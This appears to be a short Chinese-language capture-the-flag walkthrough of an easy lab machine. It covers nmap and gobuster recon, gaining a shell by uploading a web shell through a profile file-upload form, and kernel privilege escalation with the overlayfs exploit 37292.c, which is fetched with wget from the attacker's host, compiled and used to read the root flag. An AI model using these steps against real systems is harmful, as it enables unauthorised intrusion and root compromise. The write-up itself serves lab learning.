
## 靶机信息
- 级别：容易
-  HINTS:
1. Get a user shell by uploading a reverse shell and executing it.
2. A proxy may help you to upload the file you want, rather than the file that the server expects.
3. There are 3 known privesc exploits that work. Some people have had trouble executing one of them unless it was over a reverse shell using a netcat listener.

## Recon

### nmap

```shell
 nmap -sn 192.168.1.0/24 //靶机有两个网卡
//IP:192.168.1.158  192.168.1.159

sudo nmap -sT --min-rate 10000 -p- 192.168.1.158 -oA tcp_scan/ports
PORT   STATE SERVICE
80/tcp open  http
```

## Web
### 目录爆破
```shell
gobuster dir -u http://192.168.1.158 -w /usr/share/wordlists/d
irb/common.txt -x php
```
![[Pasted image 20231018111842.png]]

访问后是一个登录框，注册一个账号后登陆，点击编辑个人信息，文件上传处上传一个shell即可

## 提权

### 内核提权
```shell
多次尝试
searchsploit ubuntu 14.04

Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                                       | linux/local/37292.c

php -S 0:80
wget http://192.168.1.136/37292.c
gcc 37292.c -o 37292
```

```shell
root@simple:/root# cat flag.txt
cat flag.txt
U wyn teh Interwebs!!1eleven11!!1!
Hack the planet!
```